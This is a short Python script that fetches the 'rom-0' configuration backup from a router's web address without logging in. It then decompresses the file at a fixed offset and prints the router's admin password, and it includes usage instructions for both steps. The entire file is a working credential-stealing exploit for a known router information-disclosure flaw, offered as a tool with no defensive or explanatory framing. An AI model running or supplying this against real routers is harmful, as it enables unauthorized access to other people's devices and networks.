#!/usr/bin/python3
#Author: Athul Prakash NJ, aka psychoSherlock
#Date: October 23 2022

from routersploit.libs.lzs.lzs import LZSDecompress
import requests
import re
import sys

def get_rom(url):
    print('Downloding..')
    r = requests.get(f'{url}/rom-0')
    with open('rom-0', 'wb') as f:
        f.write(r.content)
        print('Saved as: rom-0')
    
    return 'rom-0'


def extract_password(data):
    fpos = 8568
    result, window=LZSDecompress(data[fpos:])
    print('Decompression in progress...')
    #print(f"Decompressed strings: {result}")
    

    q = re.findall("([\040-\176]{5,})", result)
    if q:
        return q[0]


if sys.argv[1]=="help":
    print("""
    Usage: 
        python3 decryptor.py get "http://192.168.1.1"
        python3 decryptor.py decrypt <FILENAME>
    """)
    pass
elif sys.argv[1]=="get":
    get_rom(sys.argv[2])
elif sys.argv[1]=="decrypt":
    if sys.argv[2]:
        fname = sys.argv[2]
    with open(fname, 'rb') as f:
        print("Router password is: " + '\t' + extract_password(f.read()))

else:
    print("""
        python3 decryptor.py --help  FOR USAGE
    """)



